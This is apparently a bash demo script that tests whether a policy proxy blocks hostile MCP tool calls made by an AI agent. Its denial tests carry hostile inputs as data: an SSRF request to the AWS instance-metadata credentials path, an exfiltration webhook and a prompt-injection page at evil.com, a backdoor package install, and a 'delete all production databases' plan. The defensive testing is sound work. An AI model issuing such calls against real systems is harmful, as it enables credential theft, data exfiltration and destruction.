#!/usr/bin/env bash
# nullfield + camazotz defense demonstration
#
# Run from the K3s node (or anywhere with access to the brain-gateway service).
# Usage: bash demo.sh [SERVICE_IP]
#
# If no SERVICE_IP is provided, auto-detects from kubectl.

set -uo pipefail

SVC_IP="${1:-}"
if [ -z "$SVC_IP" ]; then
  SVC_IP=$(kubectl -n camazotz get svc brain-gateway -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
  if [ -z "$SVC_IP" ]; then
    echo "ERROR: Could not detect brain-gateway service IP. Pass it as argument: bash demo.sh 10.43.x.x"
    exit 1
  fi
fi

BASE="http://$SVC_IP:8080/mcp"
ADMIN="http://$SVC_IP:9091"
PASS=0
FAIL=0
TOTAL=0

divider() { echo ""; echo "─────────────────────────────────────────────────────────"; echo ""; }

check_allow() {
  local id="$1" desc="$2" tool="$3" args="$4"
  TOTAL=$((TOTAL + 1))
  local resp
  resp=$(curl -s --max-time 30 -X POST "$BASE" \
    -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$id,\"method\":\"tools/call\",\"params\":{\"name\":\"$tool\",\"arguments\":$args}}")

  if echo "$resp" | grep -q '"result"'; then
    echo "  ✓ ALLOWED  $desc"
    echo "    tool: $tool"
    echo "    response: $(echo "$resp" | python3 -c "import sys,json; r=json.load(sys.stdin)['result']['content'][0]['text']; print(r[:120]+'...' if len(r)>120 else r)" 2>/dev/null || echo "$resp")"
    PASS=$((PASS + 1))
  else
    echo "  ✗ UNEXPECTED DENY  $desc"
    echo "    tool: $tool"
    echo "    response: $resp"
    FAIL=$((FAIL + 1))
  fi
}

check_deny() {
  local id="$1" desc="$2" tool="$3" args="$4" expect_code="$5"
  TOTAL=$((TOTAL + 1))
  local resp
  resp=$(curl -s -X POST "$BASE" \
    -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$id,\"method\":\"tools/call\",\"params\":{\"name\":\"$tool\",\"arguments\":$args}}")

  if echo "$resp" | grep -q "\"code\":$expect_code"; then
    local msg
    msg=$(echo "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['error']['message'])" 2>/dev/null)
    echo "  ✓ BLOCKED  $desc"
    echo "    tool: $tool"
    echo "    error: $msg"
    PASS=$((PASS + 1))
  else
    echo "  ✗ UNEXPECTED ALLOW  $desc"
    echo "    tool: $tool"
    echo "    response: $resp"
    FAIL=$((FAIL + 1))
  fi
}

echo "╔═══════════════════════════════════════════════════════╗"
echo "║       NULLFIELD + CAMAZOTZ DEFENSE DEMO              ║"
echo "╠═══════════════════════════════════════════════════════╣"
echo "║  Service:  $SVC_IP:8080                     ║"
echo "║  Path:     Service → nullfield → brain-gateway → LLM ║"
echo "╚═══════════════════════════════════════════════════════╝"

divider
echo "PREFLIGHT CHECKS"
echo ""

TOTAL=$((TOTAL + 1))
health=$(curl -sf "$ADMIN/healthz" 2>&1)
if [ "$health" = "ok" ]; then
  echo "  ✓ nullfield healthz: ok"
  PASS=$((PASS + 1))
else
  echo "  ✗ nullfield healthz: FAILED"
  FAIL=$((FAIL + 1))
fi

TOTAL=$((TOTAL + 1))
init_resp=$(curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":0,"method":"initialize","params":{}}')
server_name=$(echo "$init_resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['serverInfo']['name'])" 2>/dev/null)
if [ "$server_name" = "camazotz-brain-gateway" ]; then
  echo "  ✓ MCP initialize: $server_name"
  PASS=$((PASS + 1))
else
  echo "  ✗ MCP initialize: unexpected response"
  FAIL=$((FAIL + 1))
fi

TOTAL=$((TOTAL + 1))
tool_count=$(curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":0,"method":"tools/list","params":{}}' \
  | python3 -c "import sys,json; print(len(json.load(sys.stdin)['result']['tools']))" 2>/dev/null)
if [ "$tool_count" = "57" ]; then
  echo "  ✓ tools/list: $tool_count tools"
  PASS=$((PASS + 1))
else
  echo "  ✗ tools/list: expected 57, got $tool_count"
  FAIL=$((FAIL + 1))
fi

divider
echo "ATTACK SCENARIOS (all should be BLOCKED)"
echo ""

check_deny 10 \
  "SSRF — fetch AWS instance metadata" \
  "egress.fetch_url" \
  '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  -32000
echo ""

check_deny 11 \
  "SECRET EXFILTRATION — leak database credentials and API keys" \
  "secrets.leak_config" \
  '{}' \
  -32000
echo ""

check_deny 12 \
  "SUPPLY CHAIN — install malicious package via LLM suggestion" \
  "supply.install_package" \
  '{"package":"evil-backdoor-2.0"}' \
  -32000
echo ""

check_deny 13 \
  "RUG PULL — mutate tool to gain hidden exec capability" \
  "tool.mutate_behavior" \
  '{"mode":"evil"}' \
  -32000
echo ""

check_deny 14 \
  "SHADOW WEBHOOK — register persistent exfiltration callback" \
  "shadow.register_webhook" \
  '{"url":"https://evil.com/exfil"}' \
  -32000
echo ""

check_deny 15 \
  "PROMPT INJECTION — fetch page containing injected instructions" \
  "indirect.fetch_and_summarize" \
  '{"url":"https://evil.com/injected-prompt"}' \
  -32000
echo ""

check_deny 16 \
  "HALLUCINATION — execute unvalidated destructive LLM plan" \
  "hallucination.execute_plan" \
  '{"plan":"delete all production databases"}' \
  -32000
echo ""

check_deny 17 \
  "UNKNOWN TOOL — call a tool that does not exist in the registry" \
  "admin.drop_all_tables" \
  '{}' \
  -32003

divider
echo "LEGITIMATE OPERATIONS (all should be ALLOWED)"
echo ""

check_allow 20 \
  "READ AUDIT LOG — tier 1 read-only tool" \
  "audit.list_actions" \
  '{}'
echo ""

check_allow 21 \
  "CHECK USAGE QUOTA — tier 1 read-only tool" \
  "cost.check_usage" \
  '{}'
echo ""

check_allow 22 \
  "LIST TENANTS — tier 1 read-only tool" \
  "tenant.list_tenants" \
  '{}'
echo ""

check_allow 23 \
  "SEND MESSAGE — tier 2 write tool" \
  "comms.send_message" \
  '{"to":"security-team","body":"nullfield demo test"}'
echo ""

check_allow 24 \
  "ISSUE AUTH TOKEN — tier 2 write tool" \
  "auth.issue_token" \
  '{"username":"demo-user"}'
echo ""

check_allow 25 \
  "ASK THE LLM — tier 2, real Anthropic Claude call" \
  "config.ask_agent" \
  '{"question":"What is 7 times 8? Answer with just the number."}'

divider
echo "AUDIT TRAIL (last 10 events)"
echo ""
kubectl -n camazotz logs -l app=brain-gateway -c nullfield --tail=10 2>/dev/null | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        e = json.loads(line)
        if e.get('msg') == 'audit':
            t = e.get('event_type','')
            tool = e.get('tool','-')
            p = json.loads(e.get('payload','{}'))
            ts = p.get('timestamp','')[:19]
            reason = p.get('reason','')
            if t == 'tool.allowed':
                print(f'  {ts}  ALLOW  {tool}')
            elif t == 'tool.denied':
                print(f'  {ts}  DENY   {tool}  ({reason})')
            elif t == 'mcp.request':
                print(f'  {ts}  PASS   method={e.get(\"method\",\"\")}')
    except: pass
" 2>/dev/null || echo "  (could not read logs — run on the cluster node)"

divider
echo "╔═══════════════════════════════════════════════════════╗"
echo "║  RESULTS: $PASS passed / $FAIL failed / $TOTAL total              ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""

if [ "$FAIL" -eq 0 ]; then
  echo "All checks passed. nullfield is enforcing policy correctly."
else
  echo "WARNING: $FAIL check(s) failed. Investigate above."
  exit 1
fi
